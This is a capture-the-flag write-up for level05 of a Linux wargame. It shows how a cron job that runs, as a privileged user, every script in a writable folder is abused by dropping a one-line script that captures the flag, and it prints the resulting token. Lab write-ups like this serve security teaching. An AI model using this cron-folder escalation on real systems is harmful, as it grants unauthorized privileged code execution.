# level05 solve

When you get logged or after a few minutes we receive a message

```
> You have new mail in /var/mail/level05
```

Opening the file we got a bash command

```
$ cat level05
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

But some part was weird, so we decide to learn on the web what could be appends running that command.
After some research, we understood that was a <a href="https://cron-job.org/en/">cronjob</a> (search <a href="https://book.cakephp.org/2/fr/console-and-shells/cron-jobs.html">1</a>, <a href="https://www.thegeekstuff.com/2011/07/cron-every-5-minutes/">2</a>)

So with being informed, we decide to see what the cron script does

```
$ cat /usr/sbin/openarenaserver
> #!/bin/sh
>
> for i in /opt/openarenaserver/* ; do
>         (ulimit -t 5; bash -x "$i")
>         rm -f "$i"
> done
```

Because it's a cron, we know that will be a loop on all scripts in the folder, running and be deleted, and that every 2 minutes.

With that knowledge, we can create a script to get the password

Ok let's try that

```
$ echo "getflag > /tmp/flag" > /opt/openarenaserver/file
```

Waiting some time later (2min max)

```
$ cat /tmp/flag
> Check flag.Here is your token : viuaaale9huek52boumoomioc
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level04">previous level</a> - <a href="../../level06">next level</a>
